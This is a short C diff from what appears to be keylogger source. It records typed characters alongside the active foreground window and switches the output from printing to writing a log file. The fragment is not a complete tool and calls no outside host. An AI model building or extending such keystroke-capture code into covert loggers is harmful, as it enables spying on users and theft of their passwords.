@@ -10,14 +10,14 @@ void edit_log(short character)
 		if (window == GetForegroundWindow())
 		{
 			str_chain = add_str(str_chain, 0, character);
-			str_chain = print_str(str_chain);
+			str_chain = print_file_str(str_chain);
 		}
 		else
 		{
 			str_chain = add_str(str_chain, 0, character);
 			window = GetForegroundWindow();
 			put_window_file(window);
-			str_chain = print_str(str_chain);
+			str_chain = print_file_str(str_chain);
 		}
 	}
 }
